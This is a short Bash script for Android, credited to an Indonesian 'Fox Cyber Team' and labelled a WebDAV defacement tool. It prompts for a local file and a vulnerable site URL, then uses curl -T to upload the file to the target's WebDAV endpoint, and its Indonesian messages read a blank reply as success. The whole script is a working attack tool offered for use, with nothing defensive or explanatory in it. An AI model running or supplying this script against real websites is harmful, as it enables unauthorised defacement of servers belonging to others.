#!/system/xbin/bash
clear
sleep 1
echo "Autor : KHESA GANTENG"
sleep 1
echo "Team : Fox Cyber Team"
sleep 1
echo "Tools : Tools Deface Webdav"
sleep 2
echo " "
figlet F-Webdav
sleep 1
read -p "Nama Script : " script
echo " "
sleep 1
read -p "Web Vuln : " web
sleep 2
curl -T /storage/emulated/0/$script $web
sleep 2
echo "Jika blank berarti sukses"
sleep 1
echo "Jika muncul eror gagal"